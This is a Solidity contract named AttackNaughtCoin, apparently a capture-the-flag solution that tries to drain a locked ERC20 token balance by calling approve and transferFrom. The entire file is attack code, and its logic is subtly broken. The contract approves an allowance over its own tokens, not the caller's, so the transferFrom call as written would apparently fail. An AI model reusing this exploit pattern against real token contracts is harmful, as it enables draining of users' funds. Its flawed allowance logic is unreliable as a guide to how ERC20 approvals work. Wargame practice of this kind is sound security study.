// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/token/ERC20/ERC20.sol";

contract AttackNaughtCoin {
    constructor(ERC20 _naughtCoin) public {
        naughtCoin = _naughtCoin;
    }

    ERC20 public naughtCoin;

    function withdraw() external {
        ERC20(naughtCoin).approve(address(this), ERC20(naughtCoin).balanceOf(msg.sender));
        ERC20(naughtCoin).transferFrom(msg.sender, address(this), ERC20(naughtCoin).balanceOf(msg.sender));
    }
}